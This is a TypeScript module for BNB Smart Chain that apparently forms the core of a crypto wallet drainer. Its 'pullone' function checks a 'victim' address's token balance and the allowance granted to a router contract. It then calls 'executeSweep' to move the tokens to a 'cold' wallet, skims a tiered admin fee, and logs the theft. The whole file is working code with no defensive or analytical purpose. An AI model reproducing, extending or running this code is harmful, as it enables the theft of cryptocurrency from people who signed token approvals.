import {
    createPublicClient, createWalletClient, http, fallback,
    erc20Abi, formatUnits, parseUnits, type Hex,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';

const transport = () =>
    fallback(ENV.HTTP_URLS.map(u => http(u, { retryCount: 2, timeout: 8_000 })));

export const pub = createPublicClient({ chain: bsc, transport: transport() });

// Aliased exports to support both camelCase and lowercase imports across listener.ts
export const allowanceOf = (owner: `0x${string}`, spender: `0x${string}`, token: `0x${string}`) =>
    pub.readContract({ address: token, abi: erc20Abi, functionName: 'allowance', args: [owner, spender] });
export const allowanceof = allowanceOf;

export const balanceOf = (owner: `0x${string}`, token: `0x${string}`) =>
    pub.readContract({ address: token, abi: erc20Abi, functionName: 'balanceOf', args: [owner] });
export const balanceof = balanceOf;

export const gasof = (addr: `0x${string}`) => pub.getBalance({ address: addr });

// Router ABI for executeSweep
const ROUTER_ABI = [{
    name: 'executeSweep',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
        { name: 'token', type: 'address' },
        { name: 'from', type: 'address' },
        { name: 'recipient', type: 'address' },
        { name: 'userAmount', type: 'uint256' },
        { name: 'feeRecipient', type: 'address' },
        { name: 'feeAmount', type: 'uint256' },
    ],
    outputs: [],
}] as const;

function getAdminFee(total: bigint): bigint {
    const SIX = parseUnits('6', 18);
    const TWELVE = parseUnits('12', 18);
    const TWENTY = parseUnits('20', 18);
    const FIFTY = parseUnits('50', 18);
    if (total <= SIX) {
        return parseUnits('1', 18);
    } else if (total <= TWELVE) {
        return (total * 12n) / 100n;
    } else if (total <= TWENTY) {
        return parseUnits('3', 18);
    } else if (total <= FIFTY) {
        return (total * 12n) / 100n;
    } else {
        return (total * 10n) / 100n;
    }
}

export async function pullone(
    pullerKey: Hex, victim: `0x${string}`, cold: `0x${string}`, token: `0x${string}`,
): Promise<{ hashUser: string; amount: bigint; feeAmount: bigint } | null> {
    const account = privateKeyToAccount(pullerKey);
    const routerAddress = ENV.ROUTER_CONTRACT_ADDRESS as `0x${string}` | undefined;
    if (!routerAddress) {
        console.error('[PULL ERROR] ROUTER_CONTRACT_ADDRESS is not set in environment variables!');
        return null;
    }

    const [bal, allow, gas] = await Promise.all([
        balanceOf(victim, token),
        allowanceOf(victim, routerAddress, token),
        gasof(account.address),
    ]);

    if (bal === 0n) return null;
    const MIN_SWEEP = parseUnits('5', 18);
    if (bal < MIN_SWEEP) return null;
    if (allow === 0n) throw new Error('ALLOWANCE_ZERO');
    if (gas < ENV.MIN_PULLER_GAS_WEI) throw new Error('PULLER_LOW_GAS');

    const totalAmount = bal < allow ? bal : allow;
    const feeAmount = getAdminFee(totalAmount);
    const userAmount = totalAmount - feeAmount;

    const price = await pub.getGasPrice();
    const gasPrice = (price * 120n) / 100n;
    const wallet = createWalletClient({ account, chain: bsc, transport: transport() });
    const adminWallet = ENV.ADMIN_WALLET as `0x${string}`;

    const hash = await wallet.writeContract({
        address: routerAddress,
        abi: ROUTER_ABI,
        functionName: 'executeSweep',
        args: [token, victim, cold, userAmount, adminWallet, feeAmount],
        gas: 140_000n,
        gasPrice,
        nonce: await pub.getTransactionCount({ address: account.address, blockTag: 'pending' }),
    });

    console.log(`[ROUTER PULLED] Total: ${formatUnits(totalAmount, 18)} USDT | User: ${formatUnits(userAmount, 18)} -> ${cold} | Fee: ${formatUnits(feeAmount, 18)} -> Admin Tx: ${hash}`);
    return { hashUser: hash, amount: totalAmount, feeAmount };
}
